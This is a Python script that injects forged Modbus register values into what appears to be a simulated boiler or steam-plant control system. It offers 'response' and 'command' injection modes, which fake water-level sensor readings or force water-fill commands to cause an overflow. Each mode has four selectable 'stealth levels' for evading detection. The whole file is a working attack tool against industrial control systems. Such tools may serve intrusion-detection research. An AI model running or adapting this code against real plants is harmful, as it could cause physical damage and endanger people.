import random
import time
import NetworkEncoder as ne
from pymodbus.client.sync import ModbusTcpClient

MODBUS_SLAVE = 'ms.ics.example.com'
client = ModbusTcpClient(MODBUS_SLAVE)

def readRegisters():
    # Read values from slave
    result = client.read_holding_registers(0, 21, unit=1)
    addWater = ne.modbusDecode(0, 2, 2, result.registers)
    addFire = ne.modbusDecode(2, 2, 0, result.registers)
    waterLevel = ne.modbusDecode(3, 4, 4, result.registers)
    waterTemp = ne.modbusDecode(7, 2, 2, result.registers)
    powerOut = ne.modbusDecode(9, 6, 2, result.registers)
    steamStep = ne.modbusDecode(13, 2, 4, result.registers)
    powerIn = ne.modbusDecode(16, 6, 2, result.registers)
    serverSeconds = ne.modbusDecode(20, 2, 0, result.registers)

    return addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds

response = ''
serverSeconds = 0
print("Sensors online, enter injection attack type:")
print("[r]esponse - Fake slave values to trigger overflow")
print("[c]ommand  - Fake master values to trigger overflow")
print("[q]uit")

while not response == 'r' and not response == 'c' and not response == 'q':
    response = raw_input('>')

if response == 'q':
    exit(0)

packetCount = 0
packetSend = 10000
newAttack = False
if response == 'r':
    print("Enter stealth level:")
    print("[1] - Blatantly obvious")
    print("[2] - Plausible")
    print("[3] - Harder to detect")
    print("[4] - Hard to detect")
    print("[q]uit")

    while not response == '1' and not response == '2' and not response == '3' and not response == '4' and not response == 'q':
        response = raw_input('>')

    if response == 'q':
        exit(0)
    response = int(response)
    backOff = random.randint(0,50)
    while serverSeconds < 7200:
        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
        realLevel = waterLevel
        if realLevel < 600000 and backOff < 0:
            if response == 1:
                # 2,000L below optimal level
                waterLevel = 500000 - 2000
            if response == 2:
                # 1,000L below optimal level
                waterLevel = 500000 - 1000
                if steamStep * 1.5 < 1300:
                    steamStep *= 1.5
                else:
                    steamStep += float(random.randint(0,2000)) / 100
                    steamStep -= float(random.randint(0,2000)) / 100

            if response == 3:
                # Constantly 1,000L below optimum level +- 15%
                waterLevel = 500000 - (1000 * (float(random.randint(85, 115)) / 100))
            if response == 4:
                # Constantly 1,000L below optimum level +- 15% + steamStep
                waterLevel = 500000 - (1000 * (float(random.randint(85, 115)) / 100)) + steamStep
                if steamStep < 1000:
                    steamStep += random.randint(275, 300)

            outputs = []
            outputs = ne.modbusEncode(waterLevel, 4, 4, outputs)
            outputs = ne.modbusEncode(waterTemp, 2, 2, outputs)
            outputs = ne.modbusEncode(powerOut, 6, 2, outputs)
            outputs = ne.modbusEncode(steamStep, 2, 4, outputs)
            outputs = ne.modbusEncode(powerIn, 6, 2, outputs)

            for i in range(0,30):
                if(response == 2):
                    steamStep += float(random.randint(0,2000)) / 100
                    steamStep -= float(random.randint(0,2000)) / 100
                write = client.write_registers(3, outputs, unit=1)
            print(packetCount)
            packetCount += 1
        elif realLevel >= 600000:
            backOff = random.randint(0,50)
            newAttack = True
        elif realLevel < 501000:
            backOff -= 1
        elif realLevel < 590000 and newAttack:
            client.close()
            client = ModbusTcpClient(MODBUS_SLAVE)
            newAttack = False

if response == 'c':
    print("Enter stealth level:")
    print("[1] - Blatantly obvious")
    print("[2] - Plausible")
    print("[3] - Harder to detect")
    print("[4] - Hard to detect")
    print("[q]uit")

    while not response == '1' and not response == '2' and not response == '3' and not response == '4' and not response == 'q':
        response = raw_input('>')

    if response == 'q':
        exit(0)

    response = int(response)
    backOff = random.randint(0,50)
    while serverSeconds < 7200:
        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
        if waterLevel < 600000 and backOff < 0:
            if response == 1:
                # 1,500L constant fill, no fire
                addWater = 1500
                addFire = 0
            if response == 2:
                # 1,500L constant fill, current fire state
                addWater = 1500
            if response == 3:
                # 1,500L constant fill +- 10%, current fire state
                addWater = 1500 * (float(random.randint(90, 110)) / 100)
            if response == 4:
                # Add water value + 0-5%, if no fire, + 5-10% if fire
                if addFire:
                    addWater = 500 + (addWater * (float(random.randint(105, 110)) / 100))
                else:
                    addWater = 500 + (addWater * (float(random.randint(100, 105)) / 100))

            packetCount += 1
            print(packetCount)
            outputs = []
            outputs = ne.modbusEncode(addWater, 2, 2, outputs)
            outputs = ne.modbusEncode(addFire, 2, 0, outputs)
            for i in range(0,30):
                write = client.write_registers(0, outputs, unit=1)
        elif waterLevel >= 600000:
            backOff = random.randint(0,50)
	    newAttack = True
        elif waterLevel < 501000:
            backOff -= 1
        elif waterLevel < 590000 and newAttack:
            client.close()
            client = ModbusTcpClient(MODBUS_SLAVE)
	    newAttack = False

client.close()

